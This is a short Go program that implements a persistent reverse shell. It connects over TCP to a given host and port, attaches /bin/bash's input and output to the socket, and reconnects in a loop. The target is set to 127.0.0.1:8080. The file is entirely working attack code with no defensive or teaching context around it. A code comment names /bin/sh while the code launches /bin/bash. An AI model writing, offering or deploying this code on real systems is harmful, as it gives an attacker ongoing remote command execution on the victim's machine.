package main

import (
	"net"
	"os/exec"
	"time"
)

func reverse_shell(host string, port string) {
	connection, err := net.Dial("tcp", host+":"+port)
	if nil != err {
		time.Sleep(5 * time.Second)
		reverse_shell(host, port)
	}

	// Uses /bin/sh
	cmd := exec.Command("/bin/bash")

	//Get user instructions
	cmd.Stdin, cmd.Stdout, cmd.Stderr = connection, connection, connection

	// Start connection
	cmd.Run()

	// Close connection
	connection.Close()
	reverse_shell(host, port)
}

func main() {
	reverse_shell("127.0.0.1", "8080")
}
